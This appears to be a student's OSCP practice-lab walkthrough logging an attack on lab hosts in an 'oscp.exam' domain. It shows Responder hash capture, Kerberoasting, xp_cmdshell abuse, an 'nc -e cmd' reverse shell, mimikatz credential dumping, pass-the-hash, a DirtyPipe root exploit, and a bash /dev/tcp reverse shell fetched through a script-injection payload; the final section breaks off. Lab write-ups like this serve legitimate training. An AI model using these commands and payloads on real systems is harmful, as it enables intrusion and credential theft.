
#### Credentials


#### User
Celia.almeda
Marry.Williams 


#### Passwords



#### Flags 

.149 - local and proof (standalone)
.150 - local and proof (standalone)
.151 - local and proof (standalone)

.146 - proof only (domain joined - DC01)
.147 - NONE (domain joined - MS01)
.148 - NONE (domain joined - MS02)



#### 146




#### 147
1. Rustscan
```
──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ rustscan 192.168.218.147
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
7680/tcp  open  pando-pub    syn-ack
8000/tcp  open  http-alt     syn-ack
8080/tcp  open  http-proxy   syn-ack
8443/tcp  open  https-alt    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack
49671/tcp open  unknown      syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nmap -p$(cat 147-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.218.147
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-19 04:40 EST
Nmap scan report for 192.168.218.147
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
8000/tcp  open  http          Microsoft IIS httpd 10.0
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
8080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
8443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-02-19T09:43:27+00:00; 0s from scanner time.
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-19T09:43:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.70 seconds
```

2. Figured out dns name so add in host name. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ cat /etc/hosts
127.0.0.1       kali
192.168.233.147 MS01.oscp.exam


192.168.225.144 Crystal
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

3. Figured out there is a login page, tried sql injection and many more command execution but unsuccessful. 

4. Capture has of web_svc user using responder 
```
1. Responder
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo responder -I tun0           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0


search : \\192.168.45.242\test


[SMB] NTLMv2-SSP Client   : 192.168.233.147
[SMB] NTLMv2-SSP Username : OSCP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::OSCP:e4d5400718fbba61:98E9570462699558871BAB42CF0BF371:01010000000000008068C02F6063DA018025C899AAC571BA00000000020008004E0049003300340001001E00570049004E002D005A0053004C004B00540050005300570034005500520004003400570049004E002D005A0053004C004B0054005000530057003400550052002E004E004900330034002E004C004F00430041004C00030014004E004900330034002E004C004F00430041004C00050014004E004900330034002E004C004F00430041004C00070008008068C02F6063DA0106000400020000000800300030000000000000000000000000300000F155A510CCA40DC174253542D0CB7456BA287893B122A026C9552A01C26921050A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340032000000000000000000  
```

5. Crack the hash and obtained creds. 
```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 5600 oscpb.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

WEB_SVC::OSCP:e4d5400718fbba61:98e9570462699558871bab42cf0bf371:01010000000000008068c02f6063da018025c899aac571ba00000000020008004e0049003300340001001e00570049004e002d005a0053004c004b00540050005300570034005500520004003400570049004e002d005a0053004c004b0054005000530057003400550052002e004e004900330034002e004c004f00430041004c00030014004e004900330034002e004c004f00430041004c00050014004e004900330034002e004c004f00430041004c00070008008068c02f6063da0106000400020000000800300030000000000000000000000000300000f155a510cca40dc174253542d0cb7456ba287893b122a026c9552a01c26921050a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200340032000000000000000000:Diamond1
```

6. SSh loggind and checked all possible PE techniques, not possible any. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ ssh WEB_SVC@192.168.233.147
WEB_SVC@192.168.233.147's password: 

```

7. Done keberoasting against domain, obtained user sql_svc 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ proxychains impacket-GetUserSPNs -request -dc-ip 10.10.123.146 oscp.exam/web_svc:Diamond1

$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$b00389bb383b5be55f201321e445c222$d0b2829c5884d43.....
```

8. Crack creds of sql_svc user. 
```
──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

aebc0f7825d484f59a891ea9e711a77a29eec80e32b8139924902238488743d0bbd1b18b134f9834c26cf54abc790ce709c93884afd528209c92:Dolphin1
```

9. SSH login using sql_svc creds. Found no useful details. 

10. Establish chisel between ms01 and local machine, and then did nmap scan of ms02 found sql open port at 5985. 

11. Running sql connections. 

```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo proxychains -q impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.123.148 -windows-auth
```

12. Peformed xp_command execution and figured out to run command. 
```
SQL (OSCP\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
SQL (OSCP\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE;
SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'whoami';

SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'hostname';
output   
------   
MS02     

NULL     
```

13 Establish ligolo connection. 
```
──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ ./linproxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                   
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                   
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                    
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                     
        /____/                          /____/                                                                      
                                                                                                                    
  Made in France ♥            by @Nicocha30!                                                                        
                                                                                                                    
ligolo-ng » INFO[0034] Agent joined.                                 name="OSCP\\sql_svc@MS01" remote="192.168.233.147:62594"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - #1 - OSCP\sql_svc@MS01 - 192.168.233.147:62594
[Agent : OSCP\sql_svc@MS01] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
INFO[0078] Listener 0 created on remote agent!          
[Agent : OSCP\sql_svc@MS01] » listener_list
┌────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                                                               │
├───┬────────────────────────────────────────────────┬─────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                                          │ NETWORK │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼────────────────────────────────────────────────┼─────────┼────────────────────────┼────────────────────────┤
│ 0 │ #1 - OSCP\sql_svc@MS01 - 192.168.233.147:62594 │ tcp     │ 0.0.0.0:1234           │ 127.0.0.1:4444         │
└───┴────────────────────────────────────────────────┴─────────┴────────────────────────┴────────────────────────┘
[Agent : OSCP\sql_svc@MS01] » start
[Agent : OSCP\sql_svc@MS01] » INFO[0377] Starting tunnel to OSCP\s
```

14. Start web server on nc listner port. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.123.148 -windows-auth

┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
127.0.0.1 - - [20/Feb/2024 01:51:57] "GET /PrintSpoofer64.exe HTTP/1.1" 200 -

SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'curl http://10.10.123.147:1234/nc64.exe -o C:\Users\Public\nc.exe';

SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe 10.10.123.147 1234 -e cmd';

```

15. Obtained reverse shell. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nc -nvlp 4444 
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42632
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

16. PE with printspoofer64. 
```
PS C:\Users\Public> iwr -uri http://10.10.123.147:1234/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

PS C:\Users\Public> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

17. Get administrator hash using mimikatz. 
```
PS C:\Users\PUblic> .\mimikatz.exe

mimikatz # priviledge::debug

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

         * Username : Administrator
         * Domain   : OSCP
         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5

```

18. Pass the ntml hash to get proof. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ /usr/bin/impacket-wmiexec -hashes :59b280ba707d22e3ef0aa587fc29ffe5 Administrator@10.10.123.146
Impacket v0.11.0 - Copyright 2023 Fortra

C:\Users\Administrator\Desktop>type proof.txt
8c2b82a3e2b67d9fa5547e0bd3ea66c5
```

#### 148
1. Rustscan
```
rustscan 192.168.233.149

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

```


#### 149
1. Rustscan
```
rustscan 192.168.233.150 

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

```

2. Nmap 
```
──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nmap -p$(cat 149-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.233.149
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 03:29 EST
Nmap scan report for 192.168.233.149
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds
```

3. Found udp port and then checked snmp logs. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ snmpwalk -v2c -c public 192.168.233.149 NET-SNMP-EXTEND-MIB::nsExtendObjects       
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
```

4. Found out kiero have changed its password to default one so, ftp login with keiro:keiro creds. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ ftp kiero@192.168.210.149             
Connected to 192.168.210.149.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10097|)
150 Here comes the directory listing.
-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
```

5. Download all obtained files and try to ssh with different users. Succeed and obtained local.txt
```
──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ ssh -i id_rsa john@192.168.210.149 
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ whoami
john
john@oscp:~$ ls
RESET_PASSWD  local.txt
john@oscp:~$ cat local.txt
a006c571bbb9a9e9f85867d1e06f8315

```

6. Run linpeas and found kernel vulnerable with dirty pipe. 
```
john@oscp:~$ chmod 777 linpeas.sh
john@oscp:~$ ./linpeas.sh


[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
```

7. Login as kiero and run exploit 
```
john@oscp:~$ su kiero
Password: kiero
kiero@oscp:/home/john$ whomia
whomia: command not found
kiero@oscp:/home/john$ whoami
kiero


https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits


kiero@oscp:/tmp$ cd /dev/shm/
kiero@oscp:/dev/shm$ wget http://192.168.45.242/compile.sh
--2024-02-21 00:51:18--  http://192.168.45.242/compile.sh
Connecting to 192.168.45.242:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 71 [text/x-sh]
Saving to: ‘compile.sh’

compile.sh                 100%[=====================================>]      71  --.-KB/s    in 0s      

2024-02-21 00:51:18 (18.3 MB/s) - ‘compile.sh’ saved [71/71]

kiero@oscp:/dev/shm$ ./compile.sh
bash: ./compile.sh: Permission denied
kiero@oscp:/dev/shm$ chmod 777 compile.sh 
kiero@oscp:/dev/shm$ ./compile.sh
gcc: error: exploit-1.c: No such file or directory
gcc: fatal error: no input files
compilation terminated.
gcc: error: exploit-2.c: No such file or directory
gcc: fatal error: no input files
compilation terminated.
kiero@oscp:/dev/shm$ wget http://192.168.45.242/exploit-1.c
--2024-02-21 00:52:04--  http://192.168.45.242/exploit-1.c
Connecting to 192.168.45.242:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5364 (5.2K) [text/x-csrc]
Saving to: ‘exploit-1.c’

exploit-1.c                100%[=====================================>]   5.24K  --.-KB/s    in 0.01s   

2024-02-21 00:52:04 (358 KB/s) - ‘exploit-1.c’ saved [5364/5364]

kiero@oscp:/dev/shm$ ./compile.sh
gcc: error: exploit-2.c: No such file or directory
gcc: fatal error: no input files
compilation terminated.
kiero@oscp:/dev/shm$ wget http://192.168.45.242/exploit-2.c
--2024-02-21 00:52:17--  http://192.168.45.242/exploit-2.c
Connecting to 192.168.45.242:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7752 (7.6K) [text/x-csrc]
Saving to: ‘exploit-2.c’

exploit-2.c                100%[=====================================>]   7.57K  --

2024-02-21 00:52:18 (636 KB/s) - ‘exploit-2.c’ saved [7752/7752]

kiero@oscp:/dev/shm$ ./compile.sh
kiero@oscp:/dev/shm$ id
uid=1001(kiero) gid=1001(kiero) groups=1001(kiero)
kiero@oscp:/dev/shm$ ./compile.sh
kiero@oscp:/dev/shm$ ./exploit-1 
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
whomia
/bin/sh: 1: whomia: not found
whoami
root
ls
proof.txt  snap
cat proof.txt
e1a118c71dee613d1a3c4d97c2ca990c
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.210.149  netmask 255.255.255.0  broadcast 192.168.210.255
        ether 00:50:56:86:83:d0  txqueuelen 1000  (Ethernet)
        RX packets 11996  bytes 1745392 (1.7 MB)
        RX errors 0  dropped 681  overruns 0  frame 0
        TX packets 3454  bytes 581591 (581.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 172  bytes 14656 (14.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 172  bytes 14656 (14.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```


#### 150
1. Rustscan
```
rustscan 192.168.233.150

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack

```

2. Nmap 
```

┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nmap -p$(cat 150-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.233.150
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 03:27 EST
Nmap scan report for 192.168.233.150
Host is up (0.31s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Spring Java Framework
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: application/json;charset=UTF-8
|     Date: Tue, 20 Feb 2024 08:28:00 GMT
|     Connection: close
|     {"timestamp":"2024-02-20T08:28:01.537+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/plain;charset=UTF-8
|     Content-Length: 19
|     Date: Tue, 20 Feb 2024 08:27:59 GMT
|     Connection: close
|     {"api-status":"up"}
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Tue, 20 Feb 2024 08:27:59 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 830
|     Date: Tue, 20 Feb 2024 08:28:00 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 800
|     Date: Tue, 20 Feb 2024 08:28:02 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=2/20%Time=65D4628E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,98,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/plain;cha
SF:rset=UTF-8\r\nContent-Length:\x2019\r\nDate:\x20Tue,\x2020\x20Feb\x2020
SF:24\x2008:27:59\x20GMT\r\nConnection:\x20close\r\n\r\n{\"api-status\":\"
SF:up\"}")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OP
SF:TIONS\r\nContent-Length:\x200\r\nDate:\x20Tue,\x2020\x20Feb\x202024\x20
SF:08:27:59\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,3C6,"HT
SF:TP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nConte
SF:nt-Language:\x20en\r\nContent-Length:\x20830\r\nDate:\x20Tue,\x2020\x20
SF:Feb\x202024\x2008:28:00\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\
SF:"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Ver
SF:sion\x20Not\x20Supported</title><style\x20type=\"text/css\">h1\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
SF:nt-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahom
SF:a,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;
SF:}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgroun
SF:d-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-ser
SF:if;background:white;color:black;font-size:12px;}\x20a\x20{color:black;}
SF:\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;background-color
SF::#525D76;border:none;}</style></head><body><h1")%r(FourOhFourRequest,11
SF:3,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20application/json;charset=UT
SF:F-8\r\nDate:\x20Tue,\x2020\x20Feb\x202024\x2008:28:00\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n{\"timestamp\":\"2024-02-20T08:28:01\.537\+0000\",
SF:\"status\":404,\"error\":\"Not\x20Found\",\"message\":\"No\x20message\x
SF:20available\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak\"}")%r(S
SF:ocks5,3BB,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
SF:tf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20800\r\nDate:\x20T
SF:ue,\x2020\x20Feb\x202024\x2008:28:02\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\
SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/c
SF:ss\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-
SF:color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-
SF:serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{f
SF:ont-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76
SF:;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color
SF::black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-
SF:serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahom
SF:a,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x
SF:20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;
SF:background-color:#525D76;border:none;}</style></head><body");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.08 seconds
                                                             ds
                                                         
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo nmap -sU -sS 192.168.210.150
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 23:34 EST
Nmap scan report for 192.168.210.150
Host is up (0.31s latency).
Not shown: 1000 closed udp ports (port-unreach), 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
8080/tcp open  http-proxy

```

3. Found java query vulnerability in search subdirectory. 
```
1. First create reverse shell
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo chmod 777 rev.sh
                                                                                      
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ cat rev.sh 
bash -i >& /dev/tcp/192.168.45.242/4445 0>&1


2. Upload 
${script:javascript:java.lang.Runtime.getRuntime().exec('wget 192.168.45.242/rev.sh -O /dev/shm/rev.sh')}
/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget%20192.168.45.242%2Frev.sh%20-O%20%2Fdev%2Fshm%2Frev.sh%27%29%7D


3. Execute
